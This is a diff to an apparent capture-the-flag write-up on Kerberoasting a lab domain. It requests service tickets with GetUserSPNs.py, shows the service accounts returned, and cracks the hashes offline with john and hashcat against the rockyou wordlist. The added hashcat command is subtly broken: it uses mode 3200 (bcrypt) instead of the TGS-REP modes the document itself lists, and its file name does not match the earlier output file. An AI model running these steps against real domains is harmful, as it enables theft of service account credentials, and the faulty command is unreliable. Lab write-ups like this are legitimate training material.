@@ -32,7 +32,7 @@ Version: dev (n/a) - 02/08/23 - Ronnie Flathers @ropnop
 
 # SPNs
 
-If a user account has an SPN, we can request a service ticket on behalf of it, and crack it offline.
+If a user account has an SPN, we can request a TGS on his behalf, which we can crack offline to get the password.
 
 ```
 python GetUserSPNs.py -k scrm.local/ksimpson:ksimpson -dc-ip 10.10.11.168 -target-domain scrm.local -dc-host dc1.scrm.local -outputfile kerberoastables.txt
@@ -43,4 +43,15 @@ ServicePrincipalName          Name    MemberOf  PasswordLastSet             Last
 ----------------------------  ------  --------  --------------------------  --------------------------  ----------
 MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2023-05-21 11:51:15.168848
 MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2023-05-21 11:51:15.168848
+```
+Cracking the hash:
+```
+john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+```
+hashcat -a 0 -m 3200 kerberoastable.txt /usr/share/wordlists/rockyou.txt
+# -m flags
+  19600 | Kerberos 5, etype 17, TGS-REP
+  19700 | Kerberos 5, etype 18, TGS-REP
+  13100 | Kerberos 5, etype 23, TGS-REP
 ```
